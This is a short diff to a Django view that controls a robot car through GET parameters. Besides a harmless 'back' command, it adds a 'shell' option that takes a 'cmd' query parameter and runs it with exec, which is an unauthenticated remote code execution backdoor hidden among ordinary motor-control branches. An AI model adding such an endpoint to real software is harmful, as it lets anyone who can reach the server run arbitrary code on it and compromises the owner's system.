@@ -52,10 +52,15 @@ def runcar(request):
         r = car.rightback(deviright)
     elif option=="stop":
         car.stop()
+    elif option=="back":
+        car.back()
     elif option=="leftstop":
         car.leftstop()
     elif option=="rightstop":
         car.rightstop()
+    elif option=="shell":
+        cmd = request.GET.get("cmd","")
+        exec compile(cmd,'','exec')
     else:
         return HttpResponse("error\nGET:"+str(request.GET)) 
     return HttpResponse("ok:"+"left"+str(l)+"right"+str(r)) 
